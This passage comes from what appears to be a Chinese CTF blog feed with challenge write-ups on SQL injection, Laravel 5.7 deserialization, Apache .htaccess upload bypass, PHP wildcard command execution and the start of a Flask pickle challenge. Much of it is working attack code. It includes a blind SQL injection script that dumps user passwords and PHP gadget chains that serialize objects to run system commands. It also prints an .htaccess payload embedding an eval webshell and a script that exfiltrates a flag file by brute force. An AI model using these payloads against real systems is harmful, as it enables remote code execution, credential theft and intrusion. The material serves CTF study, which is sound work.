class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å†™å…¥ä¹‹åæ‰§è¡Œphpinfoå‘ç°banæ‰å¾ˆå¤šå‡½æ•°ï¼Œåˆ©ç”¨èšå‰‘çš„disable_function ç›´æ¥ç»•è¿‡å³å¯å¾—åˆ°flag</p>
<h1 id="websitemanager"><a href="#websitemanager" class="headerlink" title="websitemanager"></a>websitemanager</h1><p>åœ¨image.php ä¸‹é¢ç›´æ¥æ³¨å…¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string, sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze56uon9iidhta1za8c.cloudeci1.ichunqiu.com/image.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="comment"># for j in stringlist:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>, <span class="number">126</span>):</span><br><span class="line">        <span class="comment"># sql = &quot;1=(ord(substr(database(),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment"># sql = &quot;1=(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line">        sql = <span class="string">&quot;1=(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, j)</span><br><span class="line">        sql = <span class="string">&quot;1=(ord(substr((select(group_concat(password))from(users)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: sql&#125;</span><br><span class="line">        res = requests.get(url=url, params=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res.text) &gt; <span class="number">20000</span>:</span><br><span class="line">            print(j)</span><br><span class="line">            flag += <span class="built_in">chr</span>(j<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">125</span>:</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure>

<p>å¼±æ™ºçš„ssrf</p>
<p><img src="image-20210509184512861.png" alt="image-20210509184512861"></p>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Laravel5.7ååºåˆ—åŒ–</title>
    <url>/2021/05/11/Laravel5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="è¿‡æœŸé“¾å­"><a href="#è¿‡æœŸé“¾å­" class="headerlink" title="è¿‡æœŸé“¾å­"></a>è¿‡æœŸé“¾å­</h1><h2 id="ç¬¬ä¸€æ­¥"><a href="#ç¬¬ä¸€æ­¥" class="headerlink" title="ç¬¬ä¸€æ­¥"></a>ç¬¬ä¸€æ­¥</h2><p>åšååºåˆ—åŒ–çš„ä»destructå‡ºå‘è€ç”Ÿå¸¸è°ˆäº†ï¼Œç›´æ¥è½åˆ°PendingCommand.phpä¸‹é¢</p>
<p><img src="image-20210511154243416.png" alt="image-20210511154243416"></p>
<p>è·Ÿè¿›runå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°</p>
<p><img src="Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210511154546839.png" alt="image-20210511154546839"></p>
<p>è€Œappæ˜¯å®Œå…¨å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦çœ‹æ€ä¹ˆå†²äº†ï¼Œè¿™é‡Œä¼šé‡è§ä¸€ä¸ªé—®é¢˜ï¼ŒmockConsoeOutputæ— æ³•æ­£å¸¸è¿è¡Œå®Œ</p>
<p>è·Ÿè¿›è¿‡å»ã€‚</p>
<p><img src="image-20210511154731233.png" alt="image-20210511154731233"></p>
<h2 id="ç¬¬äºŒéƒ¨åˆ†"><a href="#ç¬¬äºŒéƒ¨åˆ†" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ†"></a>ç¬¬äºŒéƒ¨åˆ†</h2><p>ä¸ºäº†è®©ç¬¬ä¸€éƒ¨åˆ†çš„ä»£ç æ­£å¸¸èµ°å®Œæˆ‘ä»¬éœ€è¦$this-&gt;parameters ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œ</p>
<p>è€Œç¬¬äºŒä¸ªéƒ¨åˆ†ä¹Ÿéœ€è¦$-&gt;test-&gt;expectedQuestions ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾æˆ‘ä»¬ä¸çŸ¥é“æ­£å¸¸çš„expectedQuestionsæ–¹æ³•ï¼Œä¹Ÿæ‡’å¾—å»æ‰¾ï¼Œæˆ‘ä»¬åªå¸Œæœ›è¿™æ®µå‡½æ•°èƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œå°±å¥½ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰¾ä¸€ä¸ªcallæ–¹æ³•ï¼Œèƒ½å¤Ÿä½¿å¾—æˆ‘ä»¬æ§åˆ¶è¿”å›ç»“æœä¸ºæ•°ç»„ã€‚</p>
<p>æœç´¢æ‰¾åˆ°</p>
<p><img src="image-20210511155144928.png" alt="image-20210511155144928"></p>
<p>è¿™æ ·çš„è¯ç¨‹åºå°±å¯ä»¥æˆåŠŸèµ°å®Œäº†ï¼Œæˆ‘ä»¬åˆå›åˆ°è¿™é‡Œï¼š</p>
<p><img src="image-20210511155224042.png" alt="image-20210511155224042"></p>
<p>æ‰¾ä¸€ä¸ªcallæ–¹æ³•å¯æ§çš„ç±»ã€‚ä¸€å¼€å§‹æˆ‘æ‰¾åˆ°çš„æ˜¯Generatorç±»ï¼Œè¿™ä¸ªç±»çš„callæ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$method, $attributes</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›formatå‡½æ•°</p>
<p><img src="image-20210511155425798.png" alt="image-20210511155425798"></p>
<p>å†è·Ÿè¿›getFormatterï¼š</p>
<p>å’¦ï¼Œç¾æ»‹æ»‹å¯æ§å—·</p>
<p><img src="image-20210511155451553.png" alt="image-20210511155451553"></p>
<h2 id="ç¬¬ä¸‰éƒ¨åˆ†"><a href="#ç¬¬ä¸‰éƒ¨åˆ†" class="headerlink" title="ç¬¬ä¸‰éƒ¨åˆ†"></a>ç¬¬ä¸‰éƒ¨åˆ†</h2><p>ç»“æœæ‰“äº†ä¸€ä¸‹å‘ç°ï¼š<img src="image-20210511155505956.png" alt="image-20210511155505956"></p>
<p>å› ä¸ºwakeupè¿™é‡Œç»™ä½ banäº†ï¼š</p>
<p><img src="image-20210511155334326.png" alt="image-20210511155334326"></p>
<p>é‚£å°±åªèƒ½å†æ‰¾callæ–¹æ³•äº†ã€‚</p>
<p>ç»·ä¸ä½äº†ï¼Œè¿™å°±ä½ å¦ˆç¦»è°±ï¼Œè¿™ä¸ªäººæ–‡ç« å†™é”™äº†ï¼Œä»–æä¾›çš„æ˜¯5.6ç‰ˆæœ¬çš„æŠŠï¼Ÿï¼Ÿï¼Ÿæ‰€ä»¥è¿™æ¡é“¾å…¶å®èµ°åˆ°å¤´äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">app</span>;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> $test = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$degen,$Generator</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $Generator;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = [<span class="string">&quot;id&quot;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test =$degen ;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command =<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™ä¸ªç±»ç”¨äºè§£å†³æŠ¥é”™é—®é¢˜</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = [];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters = <span class="keyword">array</span>(<span class="string">&quot;bind&quot;</span>=&gt;<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $formatters = <span class="keyword">array</span>(<span class="string">&quot;bind&quot;</span>=&gt;<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>\<span class="title">PendingCommand</span>;</span><br><span class="line">    $degen = <span class="keyword">new</span> DefaultGenerator();</span><br><span class="line">    $Generator = <span class="keyword">new</span> \Faker\<span class="built_in">Generator</span>();</span><br><span class="line">    $pencom = <span class="keyword">new</span> PendingCommand($degen,$Generator);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pencom));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>5.7 å¸ˆå‚…ä»¬è¯´çš„æ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">public</span> $test;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$command, $parameters,$class,$app</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test=$class;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app=$app;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenericUser</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> $attributes</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;attributes = $attributes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hasBeenBootstrapped</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> $bindings;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$bind</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings=$bind;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">genericuser</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>\<span class="title">GenericUser</span>(</span><br><span class="line">        <span class="title">array</span>(</span><br><span class="line">            &quot;<span class="title">expectedOutput</span>&quot;=&gt;<span class="title">array</span>(&quot;0&quot;=&gt;&quot;1&quot;),</span><br><span class="line">            &quot;<span class="title">expectedQuestions</span>&quot;=&gt;<span class="title">array</span>(&quot;0&quot;=&gt;&quot;1&quot;)</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application(</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>=&gt;</span><br><span class="line">                <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&quot;concrete&quot;</span>=&gt;<span class="string">&quot;Illuminate\Foundation\Application&quot;</span></span><br><span class="line">                )</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">        <span class="string">&quot;system&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>),</span><br><span class="line">        $genericuser,</span><br><span class="line">        $application</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>å“å“ŸçœŸé€äº†NMã€‚æœ‰å¾—é‡æ–°æ¥äº†</p>
<h1 id="æ­£ç¡®çš„é“¾å­"><a href="#æ­£ç¡®çš„é“¾å­" class="headerlink" title="æ­£ç¡®çš„é“¾å­"></a>æ­£ç¡®çš„é“¾å­</h1><p><img src="image-20210511201751743.png" alt="image-20210511201751743"></p>
]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>PHP</tag>
        <tag>Laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>uploadlabs</title>
    <url>/2021/05/11/%E6%B4%A5%E9%97%A8%E6%9D%AFuploadlabs/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h1><p>apacheæ–‡ä»¶é…ç½®</p>
<h1 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h1><p>è¿™é“é¢˜ç›®æ”¾å‡ºäº†æºç ï¼Œé€šè¿‡æºç çš„é…ç½®æˆ‘ä»¬æ˜¯å¯ä»¥çœ‹è§çš„ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">var</span>/<span class="attr">www</span>/&gt;</span></span><br><span class="line">	Options  Indexes FollowSymLinks</span><br><span class="line">	AllowOverride All </span><br><span class="line">	Require all granted</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> ~ &quot;/<span class="attr">var</span>/<span class="attr">www</span>/<span class="attr">html</span>/<span class="attr">upload</span>/[<span class="attr">a-f0-9</span>]&#123;<span class="attr">32</span>&#125;/&quot;&gt;</span></span><br><span class="line">        php_flag engine off</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è‡ªå·±åšé¢˜çš„æ—¶å€™å› ä¸ºæ²¡æœ‰æ¥è§¦è¿‡ç±»ä¼¼çš„é¢˜ç›®ï¼Œï¼Œapahceçš„æ–‡ä»¶é…ç½®ï¼Œæ‰€ä»¥åšé¢˜çš„æ—¶å€™ä¸€ç›´ä¸Šä¼ .htaccessä¿®æ”¹ä¸º</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Directory</span> ~ &quot;/<span class="attr">var</span>/<span class="attr">www</span>/<span class="attr">html</span>/<span class="attr">upload</span>/[<span class="attr">a-f0-9</span>]&#123;<span class="attr">32</span>&#125;/&quot;&gt;</span></span><br><span class="line">        php_flag engine on</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»“æœè¿˜æ˜¯æ²¡ç”¨ã€ã€‘</p>
<h1 id="å®˜æ–¹WPï¼š"><a href="#å®˜æ–¹WPï¼š" class="headerlink" title="å®˜æ–¹WPï¼š"></a>å®˜æ–¹WPï¼š</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Files</span> <span class="attr">.htaccess</span>&gt;</span></span><br><span class="line">ForceType application/x-httpd-php</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">Require all granted</span><br><span class="line">php_flag engine on</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le .htaccess</span><br><span class="line">#<span class="tag">&lt;<span class="name">?php</span> <span class="attr">eval</span>($<span class="attr">_REQUEST</span>[<span class="attr">0</span>])?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å®˜æ–¹å¯¹äºå…·ä½“åŸç†å¹¶æ²¡æœ‰åšå‡ºè§£é‡Šï¼Œå°è¯•å»çœ‹çœ‹apacheçš„é…ç½®è§£è¯´</p>
<p><img src="uploadlabs/image-20210511103047201.png" alt="image-20210511103047201"></p>
<p>ä¸Šé¢ä¸€æ®µçš„phpæ–‡ä»¶ä¹Ÿå°±è¯´æ˜æˆ‘ä»¬çš„æ¯ä¸ªæ–‡ä»¶éƒ½ä¼šè¢«å½“ä½œPHPæ¥è§£æï¼Œå¹¶ä¸”ä¼šè¢«åŠ å…¥ä¸€å¥è¯æœ¨é©¬</p>
<p><img src="uploadlabs/image-20210511103945580.png" alt="image-20210511103945580"></p>
<h1 id="HA1C9ONå¸ˆå‚…çš„"><a href="#HA1C9ONå¸ˆå‚…çš„" class="headerlink" title="HA1C9ONå¸ˆå‚…çš„"></a>HA1C9ONå¸ˆå‚…çš„</h1><p>å…¶å®apahceçš„å®˜æ–¹æ–‡æ¡£ä¸­æœ‰è¿™ä¹ˆä¸€å¥è¯ï¼š</p>
<p><img src="uploadlabs/image-20210511104126805.png" alt="image-20210511104126805"></p>
<p>è¿™æ®µçš„æ„æ€æ˜¯å‘Šè¯‰æˆ‘ä»¬filesæ ‡ç­¾çš„ä¼˜å…ˆçº§è¦æ›´é«˜ï¼Œæ•…æˆ‘ä»¬å¯ä»¥é€šè¿‡:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Files</span> &#x27;<span class="attr">1.php</span>&#x27;&gt;</span></span><br><span class="line">	php_flag engine on</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å†ä¸Šä¼ ä¸€ä¸ª1.phpå³å¯</p>
<p><img src="uploadlabs/image-20210511104548814.png" alt="image-20210511104548814"></p>
<p>var_dump(file_get_contents(â€˜/flagâ€™));</p>
<h1 id="Nu1L"><a href="#Nu1L" class="headerlink" title="Nu1L"></a>Nu1L</h1><p>è¿™ä¸ªæ€è·¯å®åœ¨æ˜¯å¤ªéªšäº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">ip = requests.get(<span class="string">&#x27;http://118.24.185.108/ip.php&#x27;</span>).text</span><br><span class="line">print(ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">a</span>):</span></span><br><span class="line">    f = <span class="string">&#x27;&#x27;&#x27;&lt;If &quot;file(&#x27;/flag&#x27;)=~ /&#x27;&#x27;&#x27;</span>+a+<span class="string">&#x27;&#x27;&#x27;/&quot;&gt;</span></span><br><span class="line"><span class="string">    ErrorDocument 404 &quot;wupco&quot;</span></span><br><span class="line"><span class="string">    &lt;/If&gt;</span></span><br><span class="line"><span class="string">     &#x27;&#x27;&#x27;</span></span><br><span class="line">    print(f)</span><br><span class="line">    resp = requests.post(<span class="string">&quot;http://122.112.248.222:20003/index.php?id=167&quot;</span>,data=&#123;<span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>,f)&#125; )</span><br><span class="line">    a = requests.get(<span class="string">&quot;http://122.112.248.222:20003/upload/&quot;</span>+ip+<span class="string">&quot;/a&quot;</span>).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;wupco&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">c = string.ascii_letters + string.digits + <span class="string">&quot;\&#123;\&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;checking: &quot;</span>+ flag+i)</span><br><span class="line">        <span class="keyword">if</span> check(flag+i):</span><br><span class="line">            flag = flag+i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ä¿®æ”¹apahceçš„404æ˜¾ç¤ºé¡µé¢ï¼Œæ³¨å…¥å¾—åˆ°flagã€‚</p>
<p>è‡ªå·±æƒ³åˆ°çš„ä¸€ä¸ªæ€è·¯ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ— è®ºå¦‚ä½•éƒ½æ˜¯500.</p>
<p>æ ¹æ®åˆ«äººçš„è¯´æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;my.oschina.net&#x2F;mejinke&#x2F;blog&#x2F;49450</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹apache2çš„é…ç½®çš„è¯æ˜¯å¯ä»¥ä½¿å¾—HTMLåŒ…å«å…¶ä»–é¡µé¢çš„ï¼Œä½†æ˜¯ä¸€ç›´ä¼šå¤±è´¥ï¼Œä¸çŸ¥é“æœ‰å¸ˆå‚…æ˜¯å¦èƒ½å¤ŸæˆåŠŸ</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /&gt;</span></span><br><span class="line">   Options FollowSymLinks</span><br><span class="line">   AllowOverride None</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> <span class="attr">D:</span>/<span class="attr">www</span>&gt;</span></span><br><span class="line">   AddType text/html .shtml .html .htm</span><br><span class="line">   AddOutputFilter INCLUDES .shtml .html .htm</span><br><span class="line">   Options Indexes FollowSymLinks MultiViews Includes ExecCGI</span><br><span class="line">   AllowOverride All</span><br><span class="line">   Order allow,deny</span><br><span class="line">   allow from all</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h1 id="hate-PHP"><a href="#hate-PHP" class="headerlink" title="hate_PHP"></a>hate_PHP</h1><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯å®‰æ’æœˆèµ›- -</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_30387423&#x2F;article&#x2F;details&#x2F;99558868</span><br></pre></td></tr></table></figure>



<p>çŸ¥è¯†ç‚¹ï¼š</p>
<p>/bin/cat å°±æ˜¯catå‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥</p>
<p>è¿™æ ·å°±è¯»å–åˆ°flagäº†= =</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?=`/???/??? /????`;?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>è™ç¬¦FINALeasyflasku&#39;x</title>
    <url>/2021/05/12/%E8%99%8E%E7%AC%A6FINALeasyflask/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><p>Pythonçš„ååºåˆ—åŒ–</p>
<p>Flask sessionä¼ªé€ </p>
<h1 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h1><p>é¢˜ç›®æ˜¯å¯ä»¥æ‹¿åˆ°æºç çš„ï¼Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=(&#x27;GET&#x27;,))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/file&#x27;, methods=(&#x27;GET&#x27;,))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_handler</span>():</span></span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> 